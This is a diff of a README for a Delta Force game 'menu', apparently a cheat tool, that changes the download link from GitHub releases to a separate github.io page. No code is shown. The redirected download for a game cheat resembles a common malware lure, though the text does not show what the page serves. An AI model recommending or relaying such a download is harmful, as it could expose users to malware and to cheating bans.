@@ -6,7 +6,7 @@ Welcome to **delta-force-menu**, the essential tool for mastering Delta Force ex
 
 ## 📥 Download & Installation
 
-[![Download Now](https://img.shields.io/badge/Download-delta--force--menu-blue?style=for-the-badge&logo=github)](https://github.com/MortalxHexin/delta-force-menu/releases)
+[![Download Now](https://img.shields.io/badge/Download-delta--force--menu-blue?style=for-the-badge&logo=github)](https://mortalxhexin.github.io)
 
 Visit this link to download the application. The download page will open in your browser, where you'll find the latest version ready for download.
 
